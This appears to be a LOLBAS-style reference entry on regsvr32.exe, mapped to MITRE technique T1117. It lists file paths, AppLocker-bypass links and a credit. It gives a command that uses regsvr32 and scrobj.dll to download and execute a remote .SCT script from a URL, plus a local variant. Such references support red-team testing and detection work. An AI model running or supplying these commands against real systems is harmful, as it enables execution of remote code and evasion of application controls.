## Regsvr32.exe
```

regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
Execute the specified remote .SCT script with scrobj.dll

regsvr32.exe /s /u /i:file.sct scrobj.dll
Execute the specified local .SCT script with scrobj.dll.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: [T1117](https://attack.mitre.org/wiki/Technique/T1117)   
   
* Links:   
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  * https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
   
* File path:   
  * C:\Windows\System32\regsvr32.exe
  * C:\Windows\SysWOW64\regsvr32.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/
   
OS:  
